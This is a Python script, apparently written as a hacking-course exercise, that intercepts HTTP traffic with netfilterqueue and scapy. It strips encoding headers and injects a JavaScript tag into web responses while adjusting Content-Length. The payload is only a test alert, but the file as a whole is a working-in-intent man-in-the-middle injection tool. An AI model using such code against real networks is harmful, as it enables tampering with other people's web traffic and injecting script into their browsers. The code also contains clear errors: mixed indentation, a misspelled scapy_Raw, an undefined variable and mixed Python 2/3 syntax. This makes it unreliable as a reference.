#code is reffered from the previos proxy code
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list =[]

def set_load(packet,load):
    packet[scapy.Raw].load= load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload()) #prints the trapped packet
    if scapy_packet.haslayer(scapy.Raw):
        load =scapy_packet[scapy_Raw].load
        if scapy_packet[scapy.TCP].dport== 80: #TCp feildd has a parma of ports
            print("[+]HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\n","",load)
            print(scapy_packet.show())

		elif scapy_packet[scapy.TCP].sport == 80:
			print "[+] Response "
			#print scapy_packet.show()
            injection_code= "<script>alert('test');</script>"
			load=load.replace("</body>",injection_code+"</body>") #cuz body is the las ttag of the page / hence load JS after html code
			content_length_search = re.search("(?:Content-length:\s)(\d*)", load)
            if content_length_search and "text/html" in load: # for images , css files etc
                
                content_length=content_length_search.group(1)  #get only the value of the content-length
                new_content_length= int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load!=scapy_packet[scapy_Raw].load:  #checking if load has changed to modified load
            new_packet=set_load(scapy_packet,modified_load) # convert packet to scapy packet and change some things
            packet.set_payload(str(new_packet))

    packet.accept() #forward the packet to the target packet.drop to drop packts (net cuter)

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()


# to practice on our own computer
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#  sudo iptables -I INPUT -j NFQUEUE --queue-num 0

